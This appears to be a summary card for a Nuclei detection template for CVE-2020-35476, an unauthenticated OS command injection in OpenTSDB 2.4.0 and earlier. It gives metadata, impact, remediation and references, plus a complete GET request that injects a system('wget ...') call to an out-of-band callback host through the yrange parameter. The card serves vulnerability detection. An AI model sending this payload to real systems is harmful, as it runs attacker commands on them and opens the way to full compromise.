---
cve_id: CVE-2020-35476
template_path: nuclei-templates/http/cves/2020/CVE-2020-35476.yaml
affected_product: OpenTSDB
severity: critical
authentication: none
external_callback: true
affected_versions: <=2.4.0
preconditions: []
poc_classification: rce
---

## Vulnerability
OpenTSDB 2.4.0 and earlier is susceptible to remote code execution via the yrange parameter written to a gnuplot file in the /tmp directory. Attacker-controlled input reaches `system()` with no sanitization, allowing OS command injection. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

**Impact**: Successful exploitation could allow an attacker to execute arbitrary code on the affected system (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H, score 9.8, CWE-78).

**Remediation**: Upgrade OpenTSDB to a version higher than 2.4.0.

## PoC / Detection
Classification: rce

The template issues a single unauthenticated GET request to `{{BaseURL}}/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('wget http://{{interactsh-url}}')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json`. It matches on HTTP 200 status, `application/json` Content-Type header, and body containing the words "plotted", "timing", and "cachehit" (indicating the plotting engine processed the injected payload).

## References
- https://github.com/OpenTSDB/opentsdb/issues/2051
- http://packetstormsecurity.com/files/170331/OpenTSDB-2.4.0-Command-Injection.html
- https://nvd.nist.gov/vuln/detail/CVE-2020-35476
